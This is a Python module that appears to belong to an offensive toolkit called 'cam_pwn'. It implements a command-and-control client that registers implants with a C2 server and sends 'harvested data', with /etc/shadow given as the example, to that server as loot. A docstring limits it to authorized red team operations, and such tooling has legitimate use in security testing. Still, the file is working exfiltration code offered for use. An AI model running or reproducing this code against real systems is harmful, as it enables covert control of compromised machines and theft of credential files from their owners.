"""
C2 (Command & Control) integration: Covenant, Empire-style beaconing.
For authorized red team operations only.
"""

import logging
from typing import Any, Dict, Optional

import requests
from cam_pwn.config import get

logger = logging.getLogger(__name__)


class C2Client:
    """Generic C2 HTTP API client (beacon registration, task pull)."""

    def __init__(self, endpoint: Optional[str] = None, api_key: Optional[str] = None):
        cfg = get("c2", {}) or {}
        self.enabled = cfg.get("enabled", False)
        self.endpoint = (endpoint or cfg.get("endpoint", "")).rstrip("/")
        self.api_key = api_key or cfg.get("api_key", "")
        self.session = requests.Session()
        if self.api_key:
            self.session.headers["Authorization"] = f"Bearer {self.api_key}"

    def register_implant(self, ip: str, hostname: str, metadata: Optional[Dict[str, Any]] = None) -> bool:
        """Register a new beacon/implant with the C2 server."""
        if not self.enabled or not self.endpoint:
            return False
        try:
            r = self.session.post(
                f"{self.endpoint}/api/implants",
                json={
                    "ip": ip,
                    "hostname": hostname,
                    "metadata": metadata or {},
                },
                timeout=10,
            )
            return r.status_code in (200, 201)
        except Exception as e:
            logger.debug("C2 register failed: %s", e)
            return False

    def send_loot(self, implant_id: str, loot_type: str, data: str) -> bool:
        """Send harvested data (e.g. /etc/shadow) to C2."""
        if not self.enabled or not self.endpoint:
            return False
        try:
            r = self.session.post(
                f"{self.endpoint}/api/loot",
                json={"implant_id": implant_id, "type": loot_type, "data": data},
                timeout=10,
            )
            return r.status_code in (200, 201)
        except Exception as e:
            logger.debug("C2 loot failed: %s", e)
            return False
